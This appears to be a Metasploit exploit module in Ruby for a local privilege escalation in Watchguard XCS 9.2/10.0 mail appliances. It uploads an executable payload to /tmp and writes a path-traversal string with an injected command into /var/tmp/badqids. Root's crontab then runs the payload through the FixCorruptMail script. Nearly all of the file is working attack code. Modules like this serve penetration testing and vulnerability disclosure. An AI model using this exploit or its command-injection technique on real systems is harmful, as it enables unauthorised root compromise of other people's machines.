# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Local
  # It needs 3 minutes wait time
  # WfsDelay set to 180, so it should be a Manual exploit,
  # to avoid it being included in automations
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Watchguard XCS FixCorruptMail Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the Watchguard XCS &#039;FixCorruptMail&#039; script called
        by root&#039;s crontab which can be exploited to run a command as root within 3 minutes.
      },
      &#039;Author&#039;         =>
        [
          &#039;Daniel Jensen <daniel.jensen[at]security-assessment.com>&#039; # discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf&#039;]
        ],
      &#039;Platform&#039;       => &#039;bsd&#039;,
      &#039;Arch&#039;           => ARCH_X86_64,
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [ &#039;Watchguard XCS 9.2/10.0&#039;, { }]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 180 },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 29 2015&#039;
    ))
  end

  def setup
    @pl = generate_payload_exe
    if @pl.nil?
      fail_with(Failure::BadConfig, &#039;Please select a native bsd payload&#039;)
    end

    super
  end

  def check
    #Basic check to see if the device is a Watchguard XCS
    res = cmd_exec(&#039;uname -a&#039;)
    return Exploit::CheckCode::Detected if res && res.include?(&#039;support-xcs@watchguard.com&#039;)

    Exploit::CheckCode::Safe
  end

  def upload_payload
    fname = "/tmp/#{Rex::Text.rand_text_alpha(5)}"

    write_file(fname, @pl)
    return nil unless file_exist?(fname)
    cmd_exec("chmod +x #{fname}")

    fname
  end

  def exploit
    print_warning(&#039;Rooting can take up to 3 minutes.&#039;)

    #Generate and upload the payload
    filename = upload_payload
    fail_with(Failure::NotFound, &#039;Payload failed to upload&#039;) if filename.nil?
    print_status("Payload #{filename} uploaded.")

    #Sets up empty dummy file needed for privesc
    dummy_filename = "/tmp/#{Rex::Text.rand_text_alpha(5)}"
    cmd_exec("touch #{dummy_filename}")
    vprint_status(&#039;Added dummy file&#039;)

    #Put the shell injection line into badqids
    #setup_privesc = "echo \"../../../../../..#{dummy_filename};#{filename}\" > /var/tmp/badqids"
    badqids = write_file(&#039;/var/tmp/badqids&#039;, "../../../../../..#{dummy_filename};#{filename}")
    fail_with(Failure::NotFound, &#039;Failed to create badqids file to exploit crontab&#039;) if badqids.nil?
    print_status(&#039;Badqids created, waiting for vulnerable script to be called by crontab...&#039;)
    #cmd_exec(setup_privesc)

    #Cleanup the files we used
    register_file_for_cleanup(&#039;/var/tmp/badqids&#039;)
    register_file_for_cleanup(dummy_filename)
    register_file_for_cleanup(filename)
  end

end

